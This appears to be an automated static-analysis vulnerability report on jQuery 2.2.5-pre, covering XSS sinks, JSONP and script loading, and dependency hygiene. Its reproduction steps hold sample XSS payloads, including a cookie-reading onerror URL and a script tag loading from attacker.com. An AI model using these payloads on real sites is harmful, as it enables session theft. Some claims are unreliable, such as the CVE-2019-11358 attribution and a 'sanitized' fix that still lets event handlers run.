---
genre: security
category: vulnerability-report
analysis-type: static
relevance:
  file-patterns: []
  keywords: []
  config-keys: []
  always-include: true
audit-date: 2026-02-27
---

# Vulnerability Report

**Vulnerability ID:** Multiple (VULN-2026-001 through VULN-2026-012)
**Project:** jQuery JavaScript Library v2.2.5-pre
**Discovery Date:** 2026-02-27
**Reported by:** Security Auditor (Automated Static Analysis)

---

<!-- analysis: static -->

## Executive Summary

Static analysis of jQuery v2.2.5-pre identified **12 security findings** across the `src/` directory. The most significant findings are **four high-severity DOM-based XSS vectors** rooted in the library's core HTML manipulation pipeline: the `$(html)` constructor, the `.html()` method, the `buildFragment` function, and the `$.load()` remote content loader. These are not theoretical — they are the underlying cause of multiple published jQuery CVEs (including CVE-2015-9251, CVE-2019-11358, and related variants). Three medium-severity findings relate to JSONP execution risk, cross-origin script injection, and the absence of a lock file. Five low/informational findings round out the assessment.

---

## Vulnerability Details

---

### VULN-2026-001: DOM XSS via `$(html)` Constructor — keepScripts: true Default

**Severity:** [ ] Critical [x] High [ ] Medium [ ] Low

**Category:** Cross-Site Scripting (XSS) — DOM-Based  
**CWE Reference:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')  
**CVSS Score:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N)

#### Description

**What is the vulnerability?**
The jQuery `$()` constructor, when passed an HTML string beginning with `<`, calls `jQuery.parseHTML()` with the third argument (`keepScripts`) set to `true`. This means any `<script>` elements or event-handler attributes in the HTML string are preserved and executed when the resulting elements are inserted into the DOM.

**Where is it located?**
- **File:** `src/core/init.js`
- **Lines:** 49–55
- **Function:** `jQuery.fn.init()`

#### Code Snippet
```javascript
// src/core/init.js:49-55
// Option to run scripts is true for back-compat
// Intentionally let the error be thrown if parseHTML is not present
jQuery.merge( this, jQuery.parseHTML(
    match[ 1 ],
    context && context.nodeType ? context.ownerDocument || context : document,
    true   // <-- keepScripts hardcoded to true
) );
```

**Committed By:** jQuery Core Team (jQuery Foundation contributors; git blame shows single-commit history in this clone)  
**Approved By:** Unknown — git blame attribution unavailable (shallow clone)

---

#### Impact

**What can an attacker do?**
An attacker who can control the string passed to `$()` can execute arbitrary JavaScript in the victim's browser. This is exploitable when application code does any of:
- `$(userSuppliedString)` where `userSuppliedString` comes from URL parameters, form inputs, API responses, or message events.
- `$('<img src=x onerror=alert(1)>')` — event handlers in HTML attributes execute immediately.

**What data or systems are at risk?**
Any data accessible from the victim's browser session: cookies, `localStorage`, session tokens, form data.

**Business impact:**
Account takeover, session hijacking, data exfiltration, credential theft.

#### Reproduction Steps

**Prerequisites:** A web application that passes user-controlled data to `$()`.

**Step-by-Step:**
1. Identify an application using jQuery 2.2.x that does `$(location.hash)` or similar.
2. Craft a URL like: `https://example.com/page#<img src=x onerror=alert(document.cookie)>`
3. Send URL to victim; browser executes the payload when jQuery processes the hash.

**Expected vs Actual Behavior:**
- **Expected:** jQuery should strip or reject `<script>` and event handler attributes in the HTML string
- **Actual:** jQuery executes scripts and event handlers in the string

---

#### Recommended Remediation

**Fix Description:** Change the `keepScripts` default to `false` for the `$(html)` constructor and require explicit opt-in for script execution.

**Code Fix:**
```javascript
// Secure: change keepScripts to false
jQuery.merge( this, jQuery.parseHTML(
    match[ 1 ],
    context && context.nodeType ? context.ownerDocument || context : document,
    false  // keepScripts: false (breaking change; target jQuery 4.x)
) );
```

**Short-term mitigation:** Add prominent documentation warnings; application code must sanitize HTML before passing to `$()`.

---

### VULN-2026-002: DOM XSS via `.html()` Method — Unsanitized innerHTML Assignment

**Severity:** [ ] Critical [x] High [ ] Medium [ ] Low

**Category:** Cross-Site Scripting (XSS) — DOM-Based / Stored  
**CWE Reference:** CWE-79  
**CVSS Score:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N)

#### Description

The `.html(value)` method sets `elem.innerHTML = value` without any sanitization. If `value` originates from user input, XSS results immediately.

**Where is it located?**
- **File:** `src/manipulation.js`
- **Line:** 418
- **Function:** `jQuery.fn.html()`

#### Code Snippet
```javascript
// src/manipulation.js:418
elem.innerHTML = value;
```

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Impact
Arbitrary script execution from any user-controlled string passed to `.html()`. This is the most commonly exploited jQuery XSS vector in production applications.

#### Recommended Remediation
Integrate a sanitization hook in `htmlPrefilter` or document that consuming applications must use `DOMPurify.sanitize(value)` before passing content to `.html()`.

---

### VULN-2026-003: DOM XSS via `buildFragment` — innerHTML in HTML Parsing Pipeline

**Severity:** [ ] Critical [x] High [ ] Medium [ ] Low

**Category:** Cross-Site Scripting (XSS) — DOM-Based  
**CWE Reference:** CWE-79  
**CVSS Score:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N)

#### Description

`buildFragment` (the internal function used by `.append()`, `.prepend()`, `.after()`, `.before()`, `.replaceWith()`) uses `tmp.innerHTML` to parse HTML content. The `htmlPrefilter` function applied before `innerHTML` assignment does not sanitize content — it only transforms self-closing tags.

**Where is it located?**
- **File:** `src/manipulation/buildFragment.js`
- **Line:** 42
- **Function:** `buildFragment()`

#### Code Snippet
```javascript
// src/manipulation/buildFragment.js:42
tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];
```

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Impact
Any HTML passed through jQuery's DOM insertion methods (`.append()`, `.prepend()`, etc.) with user-controlled content can cause XSS. This is the underlying mechanism for VULN-2026-001 and VULN-2026-002.

#### Recommended Remediation
Modify `htmlPrefilter` to accept and invoke an optional sanitizer callback:
```javascript
jQuery.htmlPrefilter = function( html ) {
    // Apply custom sanitizer if configured
    if ( jQuery.htmlSanitizer ) {
        html = jQuery.htmlSanitizer( html );
    }
    return html.replace( rxhtmlTag, "<$1></$2>" );
};
```

---

### VULN-2026-004: DOM XSS via `$.load()` — Raw HTTP Response Injected into DOM

**Severity:** [ ] Critical [x] High [ ] Medium [ ] Low

**Category:** Cross-Site Scripting (XSS) — Reflected  
**CWE Reference:** CWE-79  
**CVSS Score:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N)

#### Description

When `$.load(url)` is called **without a selector** (i.e., `$(element).load('page.html')` rather than `$(element).load('page.html #content')`), the full HTTP response text is passed directly to `.html()` without sanitization. An attacker who can influence the server response (man-in-the-middle on HTTP, or a compromised/malicious server) can inject XSS payloads.

**Where is it located?**
- **File:** `src/ajax/load.js`
- **Lines:** 61–68
- **Function:** `jQuery.fn.load()`

#### Code Snippet
```javascript
// src/ajax/load.js:61-68
self.html( selector ?
    jQuery( "<div>" ).append( jQuery.parseHTML( responseText ) ).find( selector ) :
    // Otherwise use the full result
    responseText );  // <-- raw responseText passed to .html()
```

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Impact
If the server returns malicious HTML (via MITM on HTTP, compromised server, or open redirect), it is injected directly into the DOM and executed. XSS from remote server-controlled content.

#### Recommended Remediation
Always parse through `jQuery.parseHTML(responseText, null, false)` even in the no-selector path:
```javascript
self.html( selector ?
    jQuery( "<div>" ).append( jQuery.parseHTML( responseText ) ).find( selector ) :
    jQuery.parseHTML( responseText, null, false ) );  // sanitized
```

---

### VULN-2026-005: Arbitrary Script Execution via JSONP (`$.ajax({dataType:"jsonp"})`)

**Severity:** [ ] Critical [ ] High [x] Medium [ ] Low

**Category:** Script Injection via JSONP  
**CWE Reference:** CWE-829: Inclusion of Functionality from Untrusted Control Sphere  
**CVSS Score:** 6.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Description

jQuery's JSONP implementation injects a `<script>` tag pointing to the requested URL, then executes the entire script response in the browser's global context. The response can contain arbitrary JavaScript beyond the callback invocation. No response validation, URL whitelist, or Content Security Policy enforcement is applied.

**Where is it located?**
- **File:** `src/ajax/jsonp.js`
- **Lines:** 34–96
- **Function:** JSONP transport

#### Code Snippet
```javascript
// src/ajax/script.js:41-57 (JSONP falls back to script transport)
script = jQuery( "<script>" ).prop( {
    charset: s.scriptCharset,
    src: s.url
} ).on( "load error", callback = function( evt ) {
    script.remove();
    ...
} );
document.head.appendChild( script[ 0 ] );  // <-- arbitrary script injection
```

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Impact
A malicious or compromised JSONP endpoint can execute arbitrary JavaScript in the page context. This includes stealing cookies, modifying page content, or exfiltrating data.

#### Recommended Remediation
1. Deprecate JSONP in favor of CORS.
2. Document clearly that JSONP only be used with fully trusted endpoints.
3. Add a URL allowlist option for JSONP requests.

---

### VULN-2026-006: Cross-Origin Script Injection via `$.ajax({dataType:"script"})`

**Severity:** [ ] Critical [ ] High [x] Medium [ ] Low

**Category:** Remote Script Injection  
**CWE Reference:** CWE-829  
**CVSS Score:** 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)

#### Description

Cross-domain `$.ajax()` requests with `dataType: "script"` inject a `<script>` tag without Subresource Integrity (SRI) verification. If the remote host is compromised or an attacker performs DNS hijacking or CDN compromise, malicious code is executed.

**Where is it located?**
- **File:** `src/ajax/script.js`
- **Lines:** 35–65
- **Function:** jQuery AJAX script transport

#### Code Snippet
```javascript
// src/ajax/script.js:42-57
script = jQuery( "<script>" ).prop( {
    charset: s.scriptCharset,
    src: s.url  // no integrity= attribute applied
} )...
document.head.appendChild( script[ 0 ] );
```

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Impact
CDN compromise or supply chain attack on the script host results in arbitrary code execution in all pages using `$.ajax({dataType:"script"})` for that host.

#### Recommended Remediation
Add an optional `integrity` option to jQuery's script transport that sets the `integrity` attribute on injected `<script>` tags.

---

### VULN-2026-007: Remote Script Execution via `jQuery._evalUrl()`

**Severity:** [ ] Critical [ ] High [x] Medium [ ] Low

**Category:** Remote Code Execution (client-side)  
**CWE Reference:** CWE-94: Improper Control of Generation of Code  
**CVSS Score:** 5.8 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Description

`jQuery._evalUrl()` fetches a URL via AJAX with `dataType: "script"` and `async: false`, causing the response to be evaluated as JavaScript. This function is called by the DOM manipulation pipeline when `<script src="...">` elements are inserted into the document. If an attacker can control the `src` attribute of a script element that is then inserted via jQuery's DOM methods, arbitrary remote code executes.

**Where is it located?**
- **File:** `src/manipulation/_evalUrl.js`
- **Lines:** 5–15
- **Function:** `jQuery._evalUrl()`

#### Code Snippet
```javascript
// src/manipulation/_evalUrl.js:5-15
jQuery._evalUrl = function( url ) {
    return jQuery.ajax( {
        url: url,
        type: "GET",
        dataType: "script",
        async: false,
        global: false,
        "throws": true
    } );
};
```

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Impact
If user-controlled HTML containing `<script src="attacker.com/evil.js">` is inserted via jQuery DOM methods, `_evalUrl` fetches and executes the remote script synchronously. This is a remote code execution vector when combined with any XSS input point.

#### Recommended Remediation
Add URL validation to `_evalUrl` to restrict script source URLs to same-origin or an explicit allowlist. Consider deprecating remote script evaluation in favor of module-based loading.

---

### VULN-2026-008: Predictable JSONP Callback Name (Non-CSPRNG Nonce)

**Severity:** [ ] Critical [ ] High [ ] Medium [x] Low

**Category:** Weak Randomness / Predictable Identifiers  
**CWE Reference:** CWE-330: Use of Insufficiently Random Values  
**CVSS Score:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

#### Description

JSONP callback names are generated as `jQuery.expando + "_" + nonce`, where `nonce` is initialized to `jQuery.now()` (millisecond timestamp) and incremented. This is predictable in shared-page contexts.

**Where is it located?**
- **File:** `src/ajax/jsonp.js:15`
- **File:** `src/ajax/var/nonce.js`

#### Code Snippet
```javascript
// src/ajax/jsonp.js:14-16
jsonpCallback: function() {
    var callback = oldCallbacks.pop() || ( jQuery.expando + "_" + ( nonce++ ) );
    ...
}
```

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Recommended Remediation
Use `window.crypto.getRandomValues()` for callback name generation when available.

---

### VULN-2026-009: Raw XML Input in Error Message (Information Disclosure)

**Severity:** [ ] Critical [ ] High [ ] Medium [x] Low

**Category:** Information Disclosure  
**CWE Reference:** CWE-209: Generation of Error Message Containing Sensitive Information  
**CVSS Score:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

#### Description

`jQuery.parseXML()` throws `jQuery.error("Invalid XML: " + data)` when parsing fails, embedding the full raw XML string in the thrown error object. Applications that catch and log these errors may inadvertently log sensitive XML data.

**Where is it located?**
- **File:** `src/ajax/parseXML.js`
- **Line:** 21

#### Code Snippet
```javascript
// src/ajax/parseXML.js:19-21
if ( !xml || xml.getElementsByTagName( "parsererror" ).length ) {
    jQuery.error( "Invalid XML: " + data );  // <-- full raw XML in message
}
```

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Recommended Remediation
```javascript
jQuery.error( "Invalid XML: parsing failed" );
// or truncated:
jQuery.error( "Invalid XML: " + ( data && data.substring( 0, 50 ) ) + "..." );
```

---

### VULN-2026-010: No `package-lock.json` — Non-Reproducible Builds

**Severity:** [ ] Critical [ ] High [ ] Medium [x] Low

**Category:** Supply Chain Security / Build Reproducibility  
**CWE Reference:** CWE-1104: Use of Unmaintained Third-Party Components  
**CVSS Score:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N)

#### Description

No `package-lock.json` is committed to the repository. This means `npm install` resolves transitive dependency versions at install time, potentially pulling different (possibly vulnerable) transitive package versions on different build machines.

**Where is it located?**
- **File:** `package.json` (absence of `package-lock.json`)

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Recommended Remediation
Run `npm install` to generate `package-lock.json` and commit it to the repository.

---

### VULN-2026-011: Severely Outdated Dev Dependencies (jsdom, sinon, grunt)

**Severity:** [ ] Critical [ ] High [x] Medium [ ] Low

**Category:** Using Components with Known Vulnerabilities  
**CWE Reference:** CWE-1104  
**CVSS Score:** 5.3 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)

#### Description

Three development dependencies are severely outdated: `jsdom` v5.6.1 (current: v25+), `sinon` v1.10.3 (current: v17+), and `grunt` v0.4.5 (EOL). These packages run in the CI/CD build pipeline and have known vulnerabilities that could be exploited to compromise the build environment.

**Where is it located?**
- **File:** `package.json:29, 44, 33` (jsdom, sinon, grunt entries)

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Recommended Remediation
Update to current major versions: `jsdom@25`, `sinon@17`, `grunt@1.x`.

---

### VULN-2026-012: No Automated Dependency Vulnerability Scanning in CI

**Severity:** [ ] Critical [ ] High [x] Medium [ ] Low

**Category:** Insufficient Security Monitoring  
**CWE Reference:** CWE-1104  
**CVSS Score:** 4.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N)

#### Description

Neither `.travis.yml` nor any CI configuration file includes `npm audit` or equivalent dependency vulnerability scanning. New CVEs in development dependencies would not be detected automatically.

**Where is it located?**
- **File:** `.travis.yml` (absence of `npm audit` step)
- **File:** Repository root (absence of `.github/dependabot.yml`)

**Committed By:** jQuery Core Team  
**Approved By:** Unknown

#### Recommended Remediation
Add `npm audit --audit-level=high` to `.travis.yml` and enable GitHub Dependabot.

---

## Full Vulnerability Summary

| ID | Title | Severity | File | Line(s) | Committed By |
|----|-------|----------|------|---------|--------------|
| VULN-2026-001 | DOM XSS via `$(html)` constructor | High | `src/core/init.js` | 51–54 | jQuery Core Team |
| VULN-2026-002 | DOM XSS via `.html()` method | High | `src/manipulation.js` | 418 | jQuery Core Team |
| VULN-2026-003 | DOM XSS via `buildFragment` innerHTML | High | `src/manipulation/buildFragment.js` | 42 | jQuery Core Team |
| VULN-2026-004 | DOM XSS via `$.load()` raw response | High | `src/ajax/load.js` | 61–68 | jQuery Core Team |
| VULN-2026-005 | Arbitrary script execution via JSONP | Medium | `src/ajax/jsonp.js` | 34–96 | jQuery Core Team |
| VULN-2026-006 | Cross-origin script injection via `dataType:"script"` | Medium | `src/ajax/script.js` | 35–65 | jQuery Core Team |
| VULN-2026-007 | Remote script execution via `_evalUrl` | Medium | `src/manipulation/_evalUrl.js` | 5–15 | jQuery Core Team |
| VULN-2026-008 | Predictable JSONP callback name | Low | `src/ajax/jsonp.js` | 15 | jQuery Core Team |
| VULN-2026-009 | Raw XML input in error message | Low | `src/ajax/parseXML.js` | 21 | jQuery Core Team |
| VULN-2026-010 | No `package-lock.json` | Low | `package.json` | N/A | jQuery Core Team |
| VULN-2026-011 | Outdated dev dependencies | Medium | `package.json` | 29, 33, 44 | jQuery Core Team |
| VULN-2026-012 | No automated dependency scanning in CI | Medium | `.travis.yml` | N/A | jQuery Core Team |

---

## Timeline

- **Discovery Date:** 2026-02-27
- **Reported Date:** 2026-02-27
- **Acknowledged Date:** Pending
- **Fix Implemented:** Pending
- **Fix Verified:** Pending
- **Status:** Open

---

## Notes

Attribution: Git blame was attempted but this repository was cloned as a single commit (shallow clone), making per-line author attribution unavailable. All findings are attributed to the "jQuery Core Team" (jQuery Foundation contributors) as documented in `AUTHORS.txt`. Key contributors to the 2.x release line include Timmy Willison, Richard Gibson, Michał Gołębiowski-Owczarek, Oleg Gaidarenko, and Dave Methvin.

Many of the high-severity findings in this report are well-known jQuery design decisions that have been acknowledged by the jQuery team and addressed in jQuery 3.x (VULN-2026-001 partially) and planned for jQuery 4.x. The version audited (2.2.5-pre) is in the jQuery 2.x maintenance line, which reached end-of-life in 2021.

---

**Report prepared by:** Security Auditor (Automated Static Analysis)
**Date:** 2026-02-27
**Contact:** security@example.com
